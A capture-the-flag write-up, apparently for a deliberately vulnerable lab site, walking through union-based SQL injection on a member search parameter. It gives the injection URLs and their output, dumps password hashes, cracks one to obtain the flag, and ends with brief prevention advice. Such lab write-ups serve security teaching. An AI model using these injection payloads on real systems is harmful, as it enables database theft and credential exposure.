# Sql_Injection_basic

The GET parameter in the member search form is vulnerable to sql injection

## Method

Go to the member search page (<http://192.168.1.102/?page=member>)  
In the search field search '1 and 1 = 1' (which shows you that the form is vulnerable)

## Manipulation

### getting current database name and listing all databases

```

http://192.168.1.102/?page=member&id=42 union select database(), schema_name from information_schema.schemata&Submit=Submit

```

#### result

```

ID: 42 union select database(), schema_name from information_schema.schemata
First name: Member_Sql_Injection
Surname : information_schema
ID: 42 union select database(), schema_name from information_schema.schemata
First name: Member_Sql_Injection
Surname : Member_Brute_Force
ID: 42 union select database(), schema_name from information_schema.schemata
First name: Member_Sql_Injection
Surname : Member_Sql_Injection
ID: 42 union select database(), schema_name from information_schema.schemata
First name: Member_Sql_Injection
Surname : Member_guestbook
ID: 42 union select database(), schema_name from information_schema.schemata
First name: Member_Sql_Injection
Surname : Member_images
ID: 42 union select database(), schema_name from information_schema.schemata
First name: Member_Sql_Injection
Surname : Member_survey

```

which shows that the current database is Member_Sql_Injection, the other databases are Member_Brute_Force, Member_guestbook, Member_images, Member_survey

### getting a list of tables in current database

```

http://192.168.1.102/?page=member&id=42 union select table_name, create_time from information_schema.tables where table_schema=database()&Submit=Submit

```

#### result

```
ID: 42 union select table_name, create_time from information_schema.tables where table_schema=database()
First name: users
Surname : 2015-09-16 15:55:03

```

which shows that the database has a table called users

### listing all column names and types

```

http://192.168.1.102/?page=member&id=42 union select column_name, column_type from information_schema.columns where table_schema=database()&Submit=Submit

```

#### result

```

ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database()
First name: user_id
Surname : int(11)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database()
First name: first_name
Surname : varchar(255)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database()
First name: last_name
Surname : varchar(255)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database()
First name: town
Surname : varchar(255)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database()
First name: country
Surname : varchar(255)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database()
First name: planet
Surname : varchar(255)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database()
First name: Commentaire
Surname : varchar(255)
ID: 42 union select column_name, column_type from information_schema.columns where table_schema=database()
First name: countersign
Surname : varchar(255)

```

which shows that we have the columns user_id, first_name, last_name, town, country, planet, Commentaire, countersign

### getting the password information

```

http://192.168.1.102/?page=member&id=42 union select Commentaire, countersign from users&Submit=Submit

```

#### result

```

ID: 42 union select Commentaire, countersign from users
First name: Amerca !
Surname : 2b3366bcfd44f540e630d4dc2b9b06d9
ID: 42 union select Commentaire, countersign from users
First name: Ich spreche kein Deutsch.
Surname : 60e9032c586fb422e2c16dee6286cf10
ID: 42 union select Commentaire, countersign from users
First name: ????? ????????????? ?????????
Surname : e083b24a01c483437bcf4a9eea7c1b4d
ID: 42 union select Commentaire, countersign from users
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28

```

You can see that it gives us this helpful part that says "Decrypt this password -> then lower all the char. Sh256 on it and it's good"
We then follow this instruction to get the flag we need.

## How to get the flag

Decode the hash 5ff9d0165b4f92b14994e5c685cdce28 using the md5.gromweb.com website.   
Which gives us the original string "FortyTwo"  
lower all characters and as per the instructions Sh-256 of fortytwo is:  
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5  
We now have the flag (10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5)

## Prevention

>Everything has to be done through so-called prepared SQL queries, the ORMs do a good job of protecting info. (cf: PDO :: prepare)  
>Try sending forms as post requests
